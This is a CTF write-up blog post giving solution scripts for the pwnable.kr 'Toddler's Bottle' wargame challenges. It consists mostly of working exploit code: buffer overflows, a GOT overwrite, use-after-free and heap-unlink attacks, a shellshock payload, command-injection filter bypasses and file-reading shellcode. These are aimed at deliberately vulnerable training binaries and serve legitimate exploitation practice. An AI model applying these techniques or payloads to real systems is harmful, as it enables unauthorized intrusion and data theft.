---
title: "pwnable.kr - Toddler's Bottle"
layout: post
date: 2017-06-11 4:21
tag:
- Pwning
- Hacking
- CTF
writeup: true
star: false
points: ∞
category: Pwn
---

![Pwnable.kr](/assets/images/pwnablekr.png)

**[pwnable.kr](https://pwnable.kr) is a wargame site which provides various pwn challenges regarding system exploitation. The main purpose of pwnable.kr is having "fun" while improving one's hacking skills ;)**

Toddler's Bottle is a section of easy-ish challenges. This writeup contains solutions to almost all of the challenges in that section.

So partly due to lack of time and partly because I want you to think on your own, I'll not be explaining my solutions like I do for my other [Writeups](../). I'll just be posting my python/bash/C scripts here with occasional explanations.

The scripts use the `pwntools` library.

## fd

```bash

fd@ubuntu:~$ ./fd `python -c 'print "%d"% 0x1234'`
LETMEWIN
good job :)
******** flag_redacted ***********
```

## collision

```bash

col@ubuntu:~$ ./col `python -c 'print "\xe8\x05\xd9\x1d" + "\x01"*16'`
````

**Note:** `0x1dd905e8 + 4*0x01010101 = 0x21dd09ec`

## bof

```python

from pwn import *

def exploit(r):
    value = p32(0xcafebabe)
    hack = "A"*52 + value
    print hack
    r.sendline(hack)
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = process(['./bof'])
        print util.proc.pidof(r)
        pause()

    exploit(r)
```

## flag

So this binary has been packed using [UPX](https://upx.github.io/). I suspected this because I couldn't `break` at anything in `gdb`, nor could I see the sections with `readelf -S flag`.

Unpacking binary:
```
$ upx -d flag
```

Then you can see the flag being put on the heap using [IDA](https://www.hex-rays.com/products/ida/) or `gdb`

## passcode

```python

from pwn import *

r = process("./passcode")
print util.proc.pidof(r)
pause()

r.sendline("A"*96 + p32(0x804a004))

r.sendline("%d" % int("080485d7", 16))

r.interactive()
```

## random

**random.c**

Create this file in the `/tmp/lulz` directory

```C

#include<stdio.h>

int main() {

unsigned int random = rand();

printf("%d", 0xdeadbeef^random);

}
```

Then in the `home` directory use:

```bash

random@ubuntu:~$ /tmp/lulz/a.out | ./random
```

`a.out` is the compiled binary for the C file above.

## input

This was a long one. I was so satisfied after solving this one. Helped me learn more about `pwntools` and well... inputs.

Run `generate.sh` before using `solve.py`.

**generate.sh**

``` shell

python -c 'print "\x00\x0a\x00\xff"' > /tmp/lulz/stdin
python -c 'print "\x00\x0a\x02\xff"' > /tmp/lulz/stderr
python -c 'fd = open("/tmp/lulz/"+"\x0a", "w"); fd.write("\x00\x00\x00\x00"); fd.close()'
ln -s /home/input2/flag /tmp/lulz/flag
```

**solve.py**

```python

from pwn import *
import os

argv = []

for i in range(0,100):
        argv.append("")

argv[0] = "/home/input2/input"
argv[65] = "\x00"
argv[66] = "\x20\x0a\x0d"

# Stage 1 cleared.

# input2@ubuntu:~$ python -c 'print "\x00\x0a\x02\xff"' > /tmp/lulz/stderr
# input2@ubuntu:~$ python -c 'print "\x00\x0a\x00\xff"' > /tmp/lulz/stdin

# Stage 2 cleared (Change the  files stdin and stderr refer to in the process call)

env = {}
env["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"

# Stage 3 cleared (Add env to the process call)

# $ python -c 'fd = open("/tmp/lulz"+"\x0a", "w"); fd.write("\x00\x00\x00\x00"); fd.close()'

# Stage 4 cleared (Run the python file from /tmp directory)

argv[67] = "7850"

# Stage 5 cleared (Run the client executable when in interactive mode)

# Last step is to create a symlink from flag to /home/input2/flag

p = process(argv=argv, stdin=open("/tmp/lulz/stdin", "r"), stderr=open("/tmp/lulz/stderr", "r"), env=env)
p.interactive()
```

## leg

`TODO`

## mistake

```
mistake@ubuntu:~$ ./mistake
do not bruteforce...
CCCCCCCCCC
input password : BBBBBBBBBB
Password OK
******** flag_redacted ***********
```

Basically the fd gets set to 0 due to the operator priority i.e. we are now reading the password from stdin.

## shellshock

So I have two solutions for this which are actually quite similar. I don't know why one of them segfaults after vomiting out the flag. It's probably due to some implementation details of the shell binary. **Please let me know in the comments if you have more specific reasons of why this could be segfaulting :)**

```
shellshock@ubuntu:~$ export x='() { :;}; echo  $(/bin/cat /home/shellshock/flag)'
shellshock@ubuntu:~$ ./shellshock
******** flag_redacted ***********
shock_me
```

```
shellshock@ubuntu:~$ export x='() { :;}; /bin/cat /home/shellshock/flag'
shellshock@ubuntu:~$ ./shellshock
******** flag_redacted ***********
Segmentation fault
```

## coin1

```python

from pwn import *

# Run this script on the server for fast speed(there is a time limit)

def solve(r, N, C, start=0):
    mid = (N + start)/2

    print start, mid, N

    if (N - start) == 1:
        r.sendline(str(start))
        mid += 1
    else:
        to_send = ""

        for i in range(start, mid):
            to_send += str(i) + " "

        r.sendline(to_send)
    response = r.recvuntil("\n")
    weight = 0
    print response

    if "(99)" in response:
        print r.recv()

    if response.strip().isdigit():
        weight = int(response)

        if weight % 10 == 0:
            solve(r, N, C - 1, mid)
        else:
            solve(r, mid, C - 1, start)

def main():
    r = remote("localhost", 9007)

    r.recvuntil("N=")
    while(True):
        r.recvuntil("N=")
        N = int(r.recvuntil(" "))
        r.recvuntil("C=")
        C = int(r.recvuntil("\n"))
        print N, C
        solve(r, N, C)

if __name__ == '__main__':
    main()
```

## blackjack

Just enter some negative number as the bet, say `-999999999`; then make sure you lose. Voila! You're a millionaire ;)

## lotto

```python

a = "\x08"

for i in range(0,1000):
    print 1
    print a*6
```

Basically just keep all 6 bytes same and keep trying again and again. The probability the one of the character matches your number is pretty high. He was checking 36 things so we just need to match only 1 of the 6 characters to get match == 6.

## cmd1

```bash

cmd1@ubuntu:~$ ./cmd1 "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games; cat \`python -c 'print \"\\x66\\x6c\\x61\\x67\"'\`"
```
## cmd2

Execute the following from `/tmp/lulz`:

```bash

$ ln -s /home/cmd2/flag lolz
$ /home/cmd2/cmd2 "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)tmp\$(pwd)lulz\$(pwd)lolz"
```

## uaf

```python

from pwn import *

length = 24
path = "my_file"

with open(path, "w") as f:
    f.write(p64(0x401568) + "A"*0x18)

r = process(["./uaf", str(length), path])
r.recvuntil("free\n")
r.sendline("3")
r.recvuntil("free\n")
r.sendline("2")
r.recvuntil("free\n")
r.sendline("2")
r.recvuntil("free\n")
r.sendline("1")


print util.proc.pidof(r)
pause()
r.interactive()
```

## codemap

`TODO`

## memcpy

Read about memory alignment. I've added some reading material on my [Binary Explitation repository on github](https://github.com/codemaxx/Binary-Exploitation).
Basically the ASM operation need 16 byte alignment whereas 32-bit guarantees only 8-bit alignment by default, so we need to send proper chunk sizes for copying.

```python

from pwn import *
import sys

r = remote("localhost", 9022)
r.sendline("8")
r.sendline("16")
r.sendline("32")
r.sendline("72")
r.sendline("136")
r.sendline("268")
r.sendline("600")
r.sendline("1208")
r.sendline("2408")
r.sendline("4808")
print r.recvall()
```

## asm

**print_flag.asm**

```

global _start

section .text

_start:
jmp _push_filename

_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
;xor byte [rdi + 231], 0x41

xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall

; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall

; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall

; syscall exit
xor rax, rax
add al, 60
syscall

_push_filename:
call _readfile
path: db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0
```

To get the shellcode from this file use the commands [here](https://github.com/CodeMaxx/Binary-Exploitation/blob/master/tips.md#getting-executable-from-assembly)

## unlink

```python

from pwn import *

pro = ssh("unlink", "pwnable.kr", password="guest", port=2222)
r = pro.process("./unlink")

print util.proc.pidof(r)
pause()


shell_address = p32(0x80484eb)
r.recvuntil("stack address leak: ")
stack_address = r.recvuntil("\n")
print "Stack leak: ", stack_address
r.recvuntil("heap address leak: ")
heap_address = r.recvuntil("\n")
print "Heap leak: ", heap_address
r.recvuntil("get shell!\n")
r.sendline(shell_address + "A"*12 + p32(int(stack_address, 16) + 12) + p32(int(heap_address, 16) + 8 + 4))
r.interactive()
```

**Go through other [writeups](../) for more such fun challenges.**
